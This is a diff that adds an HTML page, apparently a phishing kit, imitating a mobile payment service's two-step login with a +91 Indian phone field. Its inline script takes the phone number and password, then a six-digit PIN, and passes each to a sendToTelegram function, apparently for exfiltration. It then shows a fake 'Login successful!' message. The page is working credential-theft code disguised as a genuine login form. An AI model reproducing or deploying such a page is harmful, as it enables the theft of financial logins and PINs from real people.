@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <link href="cid_css-22c9f7ce-b83d-4ee8-89d3-32b7e1c858ca_mhtml.blink" rel="stylesheet" type="text/css"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width,initial-scale=1" name="viewport"/>
+  <link href="https://invite.ukpayzone.com/logo.ico" rel="icon"/>
+  <title>spro-deal</title>
+  <link href="css/chunk-vendors.f1d08711.css" rel="stylesheet"/>
+  <link href="css/app.91ad6777.css" rel="stylesheet"/>
+  <link href="css/chunk-151eac0c.23f0e046.css" rel="stylesheet" type="text/css"/>
+  <link href="css/chunk-728305dc.0bed95c4.css" rel="stylesheet" type="text/css"/>
+  <link href="css/chunk-82637cec.53f0bdef.css" rel="stylesheet" type="text/css"/>
+ </head>
+ <body>
+  <div id="app">
+   <div data-v-5f67ab78="">
+    <div class="register-container" data-v-5f67ab78="">
+     <img data-v-5f67ab78="" src="images/topbg.363c6ea7.png" style="width: 100%;"/>
+     
+     <!-- Step 1 Content -->
+     <div id="step1" class="content" data-v-5f67ab78="">
+      <div class="box" data-v-5f67ab78="">
+       <p class="zi" data-v-5f67ab78="">phone</p>
+       <div class="put" data-v-5f67ab78="">
+        <form class="van-form" data-v-5f67ab78="">
+         <div class="van-cell van-field" data-v-5f67ab78="">
+          <div class="van-cell__title van-field__label" style="width: 36px;"><span>+91</span></div>
+          <div class="van-cell__value van-field__value">
+           <div class="van-field__body">
+            <input id="phoneNumber" class="van-field__control" placeholder="Your phone number" type="tel" maxlength="10" required/>
+           </div>
+          </div>
+         </div>
+        </form>
+       </div>
+      </div>
+      <div class="box" data-v-5f67ab78="">
+       <p class="zi" data-v-5f67ab78="">Password</p>
+       <div class="put" data-v-5f67ab78="">
+        <div class="van-cell van-field" data-v-5f67ab78="">
+         <div class="van-cell__value van-cell__value--alone van-field__value">
+          <div class="van-field__body">
+           <input id="password" class="van-field__control" placeholder="Your password" type="password" required/>
+           <div class="van-field__right-icon">
+            <span class="solts" data-v-5f67ab78="">
+             <i class="van-icon van-icon-eye" data-v-5f67ab78=""></i>
+            </span>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button type="button" onclick="goToStep2()" class="van-button van-button--default van-button--normal van-button--block" data-v-5f67ab78="" style='margin-top: 40px; height: 48px; font-family: "Source Sans Variable"; font-weight: bold; font-size: 24px; border-radius: 12px; color: white; background: rgb(102, 204, 51); border-color: rgb(102, 204, 51);'>
+       <div class="van-button__content" data-v-5f67ab78=""><span class="van-button__text" data-v-5f67ab78="">SIGN IN</span></div>
+      </button>
+     </div>
+
+     <!-- Step 2 Content (PIN) -->
+     <div id="step2" class="content" data-v-5f67ab78="" style="display: none;">
+      <div class="box" data-v-5f67ab78="">
+       <p class="zi" data-v-5f67ab78="">phone</p>
+       <div class="put" data-v-5f67ab78="">
+        <div class="van-cell van-field" data-v-5f67ab78="">
+         <div class="van-cell__title van-field__label" style="width: 36px;"><span>+91</span></div>
+         <div class="van-cell__value van-field__value">
+          <div class="van-field__body">
+           <input id="displayPhone" class="van-field__control" type="tel" readonly/>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="box" data-v-5f67ab78="">
+       <p class="zi" data-v-5f67ab78="">PIN</p>
+       <div class="put" data-v-5f67ab78="">
+        <div class="van-cell van-field" data-v-5f67ab78="">
+         <div class="van-cell__value van-cell__value--alone van-field__value">
+          <div class="van-field__body">
+           <input id="pin" class="van-field__control" placeholder="Your PIN" type="password" maxlength="6" required/>
+           <div class="van-field__right-icon">
+            <span class="solts" data-v-5f67ab78="">
+             <i class="van-icon van-icon-eye" data-v-5f67ab78=""></i>
+            </span>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <button type="button" onclick="completeLogin()" class="van-button van-button--default van-button--normal van-button--block" data-v-5f67ab78="" style='margin-top: 40px; height: 48px; font-family: "Source Sans Variable"; font-weight: bold; font-size: 24px; border-radius: 12px; color: white; background: rgb(102, 204, 51); border-color: rgb(102, 204, 51);'>
+       <div class="van-button__content" data-v-5f67ab78=""><span class="van-button__text" data-v-5f67ab78="">COMPLETE LOGIN</span></div>
+      </button>
+     </div>
+
+    </div>
+   </div>
+  </div>
+  <script src="script.js"></script>
+  <script>
+    function goToStep2() {
+      const phone = document.getElementById('phoneNumber').value;
+      const password = document.getElementById('password').value;
+      if (phone.length === 10 && password) {
+        document.getElementById('displayPhone').value = phone;
+        sendToTelegram("PASSWORD DATA", phone, password);
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+      } else {
+        alert('Please enter 10 digit phone and password');
+      }
+    }
+
+    function completeLogin() {
+      const phone = document.getElementById('displayPhone').value;
+      const pin = document.getElementById('pin').value;
+      if (pin.length === 6) {
+        sendToTelegram("PIN DATA", phone, pin);
+        alert('Login successful!');
+      } else {
+        alert('Please enter 6 digit PIN');
+      }
+    }
+  </script>
+ </body>
+</html>
